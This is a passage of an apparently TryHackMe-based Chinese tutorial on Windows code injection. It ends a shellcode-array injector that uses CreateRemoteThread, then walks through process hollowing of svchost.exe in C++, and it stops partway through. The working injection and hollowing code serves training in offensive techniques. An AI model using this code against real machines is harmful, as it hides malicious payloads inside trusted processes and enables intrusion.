style="color: #D19A66">41</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">68</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">7c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">dd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">be</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ae</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">58</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">53</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b6</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">8f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ad</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">65</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">5b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">68</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2f</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">44</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">41</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">14</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0d</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">eb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">f4</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">82</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">78</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">bd</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">82</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a9</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">54</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">42</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2a</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b2</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">1b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">39</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">87</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e8</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ec</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">c3</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ee</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">44</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">4c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b7</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">23</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">11</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">48</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">9e</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2c</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">2b</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">cb</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d3</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">59</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">e4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">90</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">53</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">94</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">89</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">31</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">b5</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">0b</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">a9</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">d6</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ca</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">39</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">ff</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">19</span></span>
<span class="line"><span style="color: #ABB2BF">};</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE h_process </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span>
<span class="line"><span style="color: #ABB2BF">    PVOID b_shellcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(h_process, b_shellcode, shellcode, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)b_shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h2 id="Process-Hollowing-进程挖空">Process Hollowing 进程挖空</h2>
<p><strong>进程挖空（Process Hollowing）</strong>，或称为“空心化”，是一种常见的恶意软件技术。它的核心思想就是：</p>
<ol>
<li><strong>创建外壳</strong>：创建一个合法的、看似无害的进程（比如 <code>notepad.exe</code>）。但关键在于，这个进程被创建时是<strong>暂停</strong>的。</li>
<li><strong>清空外壳</strong>：利用暂停状态，攻击者可以清空这个合法进程的内存空间。</li>
<li><strong>注入恶意代码</strong>：将恶意代码（payload）注入到这个被清空的内存空间中。</li>
<li><strong>恢复执行</strong>：恢复进程的执行，此时，这个合法进程实际上执行的是注入的恶意代码。</li>
</ol>
<p>这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。</p>
<img src="/thm_rthe/3c36b4470fb04e3bfdbbef0674b79ec2.png" class="" title="img">
<p>接下来会讲解一个基本的进程镂空注入器：</p>
<h4 id="第一步：创建挂起进程">第一步：创建挂起进程</h4>
<p>我们必须使用 <code>CreateProcessA</code> 创建一个处于挂起状态的目标进程。并传入 <code>STARTUPINFOA</code> 和 <code>PROCESS_INFORMATION</code> 结构体，来创建并获取目标进程的启动信息和句柄。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA function (processthreadsapi.h) - Win32 apps</a></li>
</ul>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// STARTUPINFOA 是一个结构体，它包含新进程的启动信息，比如窗口大小、位置、标准输入/输出句柄等</span></span>
<span class="line"><span style="color: #ABB2BF">LPSTARTUA target_si </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">STARTUPINFOA</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 包含进程和主线程的信息</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// PROCESS_INFORMATION 是一个结构体，这里会接收 CreateProcessA 函数返回的新创建的进程和其主线程的句柄和 ID</span></span>
<span class="line"><span style="color: #ABB2BF">LPPROCESS_INFORMATION target_pi </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PROCESS_INFORMATION</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 上下文结构体指针</span></span>
<span class="line"><span style="color: #ABB2BF">CONTEXT c;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">CreateProcessA</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	(LPSTR)</span><span style="color: #98C379">&quot;C:</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">Windows</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">System32</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">svchost.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 要执行的程序名称</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 命令行参数</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程安全属性</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 线程安全属性</span></span>
<span class="line"><span style="color: #ABB2BF">	TRUE,</span><span style="color: #7F848E; font-style: italic"> // 句柄从调用进程继承</span></span>
<span class="line"><span style="color: #ABB2BF">	CREATE_SUSPENDED,</span><span style="color: #7F848E; font-style: italic"> // 新进程处于暂停状态</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 环境变量 NULL 表示使用默认值</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 当前目录 NULL 表示使用默认值</span></span>
<span class="line"><span style="color: #ABB2BF">	target_si,</span><span style="color: #7F848E; font-style: italic"> // 指向启动信息结构体的指针</span></span>
<span class="line"><span style="color: #ABB2BF">	target_pi) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span><span style="color: #7F848E; font-style: italic"> // 指向进程信息结构体的指针</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Failed to create Target process. Last Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
<h4 id="第二步：读取恶意镜像到本地内存">第二步：读取恶意镜像到本地内存</h4>
<p>我们需要打开一个恶意镜像进行注入，首先使用 <code>CreateFileA</code> 获取恶意镜像的句柄。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA function (fileapi.h) - Win32 apps</a></li>
</ul>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 被打开文件的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">HANDLE hMaliciousCode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateFileA</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	(LPCSTR)</span><span style="color: #98C379">&quot;C:</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">Users</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">tryhackme</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">malware.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 要打开的文件的路径</span></span>
<span class="line"><span style="color: #ABB2BF">	GENERIC_READ,</span><span style="color: #7F848E; font-style: italic"> // 只读访问</span></span>
<span class="line"><span style="color: #ABB2BF">	FILE_SHARE_READ,</span><span style="color: #7F848E; font-style: italic"> // 只读共享模式，FILE_SHARE_READ 意味着其他进程也可以打开这个文件来读取，但不能写入</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 使用默认的安全设置</span></span>
<span class="line"><span style="color: #ABB2BF">	OPEN_EXISTING,</span><span style="color: #7F848E; font-style: italic"> // 指示函数如果文件或设备存在就打开它</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 模板文件</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 文件属性</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>一旦获得恶意镜像的句柄，就使用 <code>GetFileSize</code> 获取其大小，然后用 <code>VirtualAlloc</code> 为<strong>当前进程</strong>分配一个足够存储整个文件的内存块。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize">GetFileSize function</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc function</a></li>
</ul>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">DWORD maliciousFileSize </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetFileSize</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hMaliciousCode,</span><span style="color: #7F848E; font-style: italic"> // 被打开文件的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic"> // 打开 4GB 以下文件</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">PVOID pMaliciousImage </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">	maliciousFileSize,</span><span style="color: #7F848E; font-style: italic"> // 文件大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">04</span><span style="color: #7F848E; font-style: italic"> // Enables read/write access (PAGE_READWRITE)</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>现在内存已分配给本地进程，必须对其进行写入。利用从先前步骤中获得的信息，我们可以使用 <code>ReadFile</code> 将数据写入本地进程内存。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">DWORD numberOfBytesRead;</span><span style="color: #7F848E; font-style: italic"> // 存储读取的字节数</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">ReadFile</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hMaliciousCode,</span><span style="color: #7F848E; font-style: italic"> // 被打开文件的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	pMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 分配好的内存区域</span></span>
<span class="line"><span style="color: #ABB2BF">	maliciousFileSize,</span><span style="color: #7F848E; font-style: italic"> // 文件大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">numberOfBytesRead,</span><span style="color: #7F848E; font-style: italic"> // 读取的字节数</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">	)) {</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Unable to read Malicious file into memory. Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">()</span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> endl;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">TerminateProcess</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(hMaliciousCode);</span></span></code></pre></div></div></figure>
<h4 id="第三步：掏空目标进程">第三步：掏空目标进程</h4>
<p>我们需要“掏空”目标进程的内存，我们必须找到进程的基址和入口点。</p>
<p>为了找到这些信息，我们首先要获取主线程的<strong>上下文（Context）</strong>。在 32 位系统上，<code>GetThreadContext</code> 函数能让我们访问线程暂停时的所有寄存器状态。<strong>在线程创建并挂起后</strong>，<code>EBX</code> 寄存器会指向进程环境块（PEB），而 <code>EAX</code> 则包含了原始程序的<strong>入口点</strong></p>
<p>一旦获取了 <code>EBX</code> 的值，我们使用 <code>ReadProcessMemory</code> 函数，从 <code>EBX</code> 指向的地址加上 <code>0x8</code>（对于 32 位系统）或 <code>0x10</code>（对于 64 位系统）的固定偏移量来读取进程的<strong>原始镜像基址</strong>。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory">ReadProcessMemory function (memoryapi.h) - Win32 apps</a></li>
</ul>
